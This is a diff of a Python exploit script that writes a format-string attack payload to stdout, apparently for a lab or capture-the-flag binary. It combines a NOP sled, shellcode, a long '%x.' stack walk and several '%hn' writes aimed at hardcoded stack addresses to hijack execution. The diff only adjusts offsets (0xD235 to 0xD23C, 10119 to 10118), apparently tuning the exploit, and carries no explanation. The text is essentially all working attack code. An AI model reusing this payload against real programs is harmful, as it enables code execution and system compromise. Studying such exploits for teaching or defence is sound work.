@@ -9,7 +9,7 @@ ADDRESSOFSHELL = b'\x00\x00\x7F\xFF\xFF\xFF\xD8\x80'
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
 ADDRESSOFSHELL.reverse()
 ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
-ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[6:], 'little') + 0xD235
+ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[6:], 'little') + 0xD23C
 ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[4:6], 'little')
 ADDRESSOFSHELL3 = int.from_bytes(ADDRESSOFSHELL[2:4], 'little')
 ADDRESSOFSHELL4 = int.from_bytes(ADDRESSOFSHELL[0:2], 'little')
@@ -39,5 +39,5 @@ ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(8, 'little'))
 LENTGHOFREQUIRED = 316
 
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(NOPSLED + SHELLCODE + b'%x.'*285 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' b'%' + b'10119' + b'x' + b'%hn' + b'%' + b'32775x' + b'%hn' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + ADDRESSTOWRITE4 + b'\n')
+    stdout.write(NOPSLED + SHELLCODE + b'%x.'*285 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' b'%' + b'10118' + b'x' + b'%hn' + b'%' + b'32775x' + b'%hn' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + ADDRESSTOWRITE4 + b'\n')
     #b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' + b'%hn'+ b'%' + ADDRESSOFSHELL3 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL4 + b'x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
